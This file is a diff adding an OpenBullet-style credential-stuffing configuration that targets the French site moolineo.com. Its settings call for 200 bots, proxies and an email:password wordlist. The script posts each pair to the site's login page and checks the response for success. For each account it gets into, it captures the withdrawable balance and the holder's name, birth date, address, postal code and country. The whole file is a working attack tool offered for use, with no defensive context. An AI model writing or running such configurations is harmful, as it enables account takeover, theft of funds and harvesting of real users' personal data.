@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Moolineo",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-17T21:42:22.8202266+02:00",
+  "AdditionalInfo": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "EmailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.moolineo.com/composantes/desktop/login.php" 
+  CONTENT "mail=<USER>&mdp=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.moolineo.com" 
+  HEADER "referer: https://www.moolineo.com/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Nous sommes désolé, votre adresse email" 
+  KEYCHAIN Success OR 
+    KEY "Déconnexion" 
+
+PARSE "<SOURCE>" LR "<div id=\"barre_v\" title=\"" "(validé)\" class=\"progress-bar" -> CAP "Argent retirable" 
+
+REQUEST GET "https://www.moolineo.com/composantes/desktop/fancybox/compte.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "type=\"text\" name=\"nom\" id=\"nom\" style=\"width:500px;\" value=\"" "\" disabled />" -> CAP "Nom" 
+
+PARSE "<SOURCE>" LR "name=\"prenom\" id=\"prenom\" style=\"width:500px;\" value=\"" "\" disabled />" -> CAP "Prenom" 
+
+PARSE "<SOURCE>" LR "Né(e) le" " </div>" -> CAP "Nee le" 
+
+PARSE "<SOURCE>" LR "type=\"text\" name=\"adresse\" id=\"adresse\" style=\"width:500px;\" value=\"" "\"/>" -> CAP "Adresse" 
+
+PARSE "<SOURCE>" LR "type=\"number\" name=\"postal\" id=\"postal\" style=\"width:500px;\" value=\"" "\"/>" -> CAP "ZIP" 
+
+PARSE "<SOURCE>" CSS "#id_pays > option:nth-child(1)" "innerHTML" -> CAP "Pays" 
+
